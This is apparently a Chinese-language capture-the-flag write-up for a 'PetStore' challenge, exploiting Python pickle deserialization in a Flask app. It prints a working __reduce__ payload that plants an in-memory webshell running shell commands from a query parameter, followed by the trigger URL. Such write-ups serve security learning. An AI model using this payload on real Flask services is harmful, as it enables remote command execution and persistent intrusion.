# PetStore

很明显的python pickle反序列化，重点是怎么在不出网的情况下拿到命令执行的结果。稍微搜一下“python flask不出网反序列化漏洞”就能搜到flask内存马这个关键字，然后就有了现成的payload： https://www.cnblogs.com/gxngxngxn/p/18181936 。看着代码有isinstance逻辑，所以下意识用Pet类包装了一下。后面发现好像不需要啊
```py
import pickle
import base64
import uuid
class Pet():
    def __init__(self, name, species) -> None:
        self.name = name
        self.species = species
        self.uuid = uuid.uuid4()
    def __repr__(self) -> str:
        return f"Pet(name={self.name}, species={self.species}, uuid={self.uuid})"
    def __reduce__(self):
        return (eval,("__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('gxngxngxn')).read())",))
a = Pet("a","a")
b = pickle.dumps(a)
print(base64.b64encode(b))
```
注意就算反序列化成功了也会显示`Failed to import pet`，这个不重要。随便访问一个404路由然后gxngxngxn传参命令即可： http://127.0.0.1:61625/bruh?gxngxngxn=env